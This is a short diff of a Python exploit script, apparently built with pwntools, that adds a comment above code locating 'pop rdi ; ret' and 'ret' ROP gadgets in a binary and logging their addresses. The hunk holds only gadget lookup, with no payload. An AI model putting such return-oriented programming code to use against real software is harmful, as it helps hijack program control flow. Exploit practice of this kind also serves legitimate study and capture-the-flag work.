@@ -35,6 +35,8 @@ def exploit(binary_path):
         # Use ROPgadget to find the address of a "pop rdi ; ret" instruction
         pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret']).address
         log.debug(f"The address of ROP gadget pop rdi ; ret is {hex(pop_rdi)}")
+        
+        # Use ROPgadget to find the address of a "ret" instruction
         ret = rop.find_gadget(['ret'])[0]
         log.debug(f"The address of ROP gadget ret is {hex(ret)}")
 
